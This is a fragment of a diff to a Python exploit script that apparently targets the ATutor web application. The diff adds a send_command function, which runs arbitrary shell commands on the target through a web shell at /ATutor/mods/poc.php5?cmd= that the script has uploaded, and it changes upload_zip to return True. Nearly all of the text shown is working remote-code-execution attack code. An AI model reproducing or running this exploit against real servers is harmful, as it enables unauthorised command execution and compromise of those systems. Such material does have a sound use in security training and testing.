@@ -108,7 +108,13 @@ def upload_zip(ip, session):
         r = session.post(target,files=files, data=data)
         res = r.text
 
-    # print(res)
+    return True
+
+def send_command(ip, session, command):
+    target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
+    r = session.get(target)
+    
+    return r.text
 
 def main():
     if len(sys.argv) != 2:
